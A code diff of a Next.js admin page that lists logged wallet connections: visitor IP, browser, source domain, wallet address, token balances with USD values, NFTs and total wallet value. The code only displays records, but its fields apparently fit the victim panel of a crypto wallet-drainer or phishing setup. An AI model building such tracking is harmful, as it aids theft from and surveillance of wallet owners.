@@ -1,78 +1,123 @@
 // app/admin/page.tsx
-'use client'; // This page needs to be a Client Component to use Wagmi hooks and useRouter
+'use client'; // This page is a Client Component to fetch data after mount
 
-import { useEffect } from 'react';
-import { useRouter } from 'next/navigation'; // For client-side redirects
-import { useAccount, useBalance, useDisconnect } from 'wagmi'; // Wagmi hooks
+import { useState, useEffect } from 'react';
 
-import Header from '@/components/layout/header'; // Your Header component
-import Footer from '@/components/layout/footer'; // Your Footer component
-import { Button } from '@/components/ui/button'; // Your Button component
+import Header from '@/components/layout/header';
+import Footer from '@/components/layout/footer';
+import { Button } from '@/components/ui/button';
 
-export default function AdminPanelPage() {
-  const { address, isConnected, chain } = useAccount(); // Get connected address, status, and chain info
-  const { data: balance } = useBalance({ address }); // Get balance for the connected address
-  const { disconnect } = useDisconnect(); // Hook for disconnecting wallet
-  const router = useRouter();
+interface WalletConnectionLog {
+  id: string;
+  timestamp: string;
+  walletAddress: string;
+  connectedWalletName: string;
+  chainId: number;
+  chainName: string;
+  ipAddress?: string;
+  domain: string;
+  userAgent?: string;
+  ethBalance?: string;
+  tokens?: { symbol: string; amount: string; valueUsd: string }[];
+  nftsDetected?: boolean;
+  totalWalletValueUsd?: string;
+}
 
-  // --- Protection Logic: Redirect if not connected ---
+export default function AdminDashboardPage() {
+  const [logs, setLogs] = useState<WalletConnectionLog[]>([]);
+  const [loading, setLoading] = useState(true);
+  const [error, setError] = useState<string | null>(null);
+
   useEffect(() => {
-    if (!isConnected) {
-      // If no wallet is connected, redirect to the home page
-      router.push('/');
-    }
-  }, [isConnected, router]); // Re-run this effect if connection status or router changes
+    const fetchLogs = async () => {
+      try {
+        setLoading(true);
+        setError(null);
+        const response = await fetch('/api/log-connection'); // GET request to your API route
+        if (!response.ok) {
+          throw new Error(`Error fetching logs: ${response.statusText}`);
+        }
+        const data: WalletConnectionLog[] = await response.json();
+        setLogs(data);
+      } catch (err) {
+        console.error('Failed to fetch admin logs:', err);
+        setError('Failed to load logs. Please try again.');
+      } finally {
+        setLoading(false);
+      }
+    };
 
-  // Show a loading state or nothing while redirecting
-  if (!isConnected) {
-    return null; // Or a loading spinner/message, to prevent flashing content
-  }
+    fetchLogs();
+    // You could also set up an interval to refresh logs automatically
+    // const interval = setInterval(fetchLogs, 10000); // Refresh every 10 seconds
+    // return () => clearInterval(interval); // Clean up interval on unmount
+  }, []);
 
-  // --- Render Admin Panel Content if Connected ---
   return (
     <>
       <Header />
       <main className="container flex-grow py-12 md:py-24 lg:py-32">
-        <div className="flex flex-col md:flex-row items-center justify-between mb-8">
-          <h1 className="text-4xl font-headline font-bold tracking-tighter sm:text-5xl text-primary mb-4 md:mb-0">
-            Admin Panel
+        <div className="flex items-center justify-between mb-8">
+          <h1 className="text-4xl font-headline font-bold tracking-tighter sm:text-5xl text-primary">
+            Admin Logs
           </h1>
-          <Button onClick={() => disconnect()} variant="destructive">
-            Disconnect
+          <Button onClick={() => window.location.reload()} variant="outline">
+            Refresh Logs
           </Button>
         </div>
 
-        <div className="bg-card p-6 rounded-lg shadow-md border">
-          <h2 className="text-2xl font-semibold mb-4 text-secondary-foreground">Connected Account Details</h2>
-          <div className="space-y-2">
-            <p>
-              <strong>Wallet Address:</strong>{' '}
-              <span className="font-mono text-sm break-all">{address}</span>
-            </p>
-            {chain && (
-              <p>
-                <strong>Connected Chain:</strong> {chain.name} (ID: {chain.id})
-              </p>
-            )}
-            {balance && (
-              <p>
-                <strong>Balance:</strong> {balance.formatted} {balance.symbol}
-              </p>
-            )}
-            {/* Add more account details as needed */}
-          </div>
-        </div>
+        {loading && <p className="text-center text-lg">Loading wallet connection logs...</p>}
+        {error && <p className="text-center text-lg text-red-500">{error}</p>}
 
-        {/* You can add more admin panel features here */}
-        <div className="mt-12">
-          <h2 className="text-2xl font-semibold mb-4 text-secondary-foreground">Admin Actions (Coming Soon)</h2>
-          <p className="text-muted-foreground">
-            
-          {/* Example:
-          <Button className="mt-4">Manage Loans</Button>
-          <Button className="mt-4 ml-4">View User Data</Button>
-          */}
-        </div>
+        {!loading && !error && logs.length === 0 && (
+          <p className="text-center text-lg text-muted-foreground">No wallet connections logged yet.</p>
+        )}
+
+        {!loading && !error && logs.length > 0 && (
+          <div className="space-y-6">
+            {logs.map((log) => (
+              <div key={log.id} className="bg-card p-6 rounded-lg shadow-md border">
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <div>
+                    <p><strong>User ID:</strong> {log.id}</p>
+                    <p><strong>Connected Wallet:</strong> {log.connectedWalletName}</p>
+                    <p><strong>Domain:</strong> {log.domain}</p>
+                    <p><strong>IP:</strong> {log.ipAddress}</p>
+                    <p><strong>OS/Browser:</strong> {log.userAgent}</p>
+                    <p><strong>Connection Time:</strong> {new Date(log.timestamp).toLocaleString()}</p>
+                  </div>
+                  <div>
+                    <p><strong>Address:</strong> <span className="font-mono text-sm break-all">{log.walletAddress}</span></p>
+                    <p><strong>Chain:</strong> {log.chainName} (ID: {log.chainId})</p>
+                    <p><strong>ETH/Native Balance:</strong> {log.ethBalance}</p>
+                    <p><strong>Tokens:</strong> {log.tokens && log.tokens.length > 0 ? (
+                      <ul>
+                        {log.tokens.map((token, idx) => (
+                          <li key={idx}>- {token.amount} {token.symbol} (${token.valueUsd})</li>
+                        ))}
+                      </ul>
+                    ) : 'Not detected / Fetching...'}
+                    </p>
+                    <p><strong>NFTs:</strong> {log.nftsDetected ? 'Detected' : 'Not detected'}</p>
+                    <p><strong>Total Value:</strong> ${log.totalWalletValueUsd}</p>
+                    {log.walletAddress && (
+                      <p className="mt-2">
+                        <a
+                          href={`https://etherscan.io/address/${log.walletAddress}`} // Adjust scanner URL for other chains if needed
+                          target="_blank"
+                          rel="noopener noreferrer"
+                          className="text-blue-500 hover:underline"
+                        >
+                          View wallet on scanner (Etherscan example)
+                        </a>
+                      </p>
+                    )}
+                  </div>
+                </div>
+              </div>
+            ))}
+          </div>
+        )}
       </main>
       <Footer />
     </>
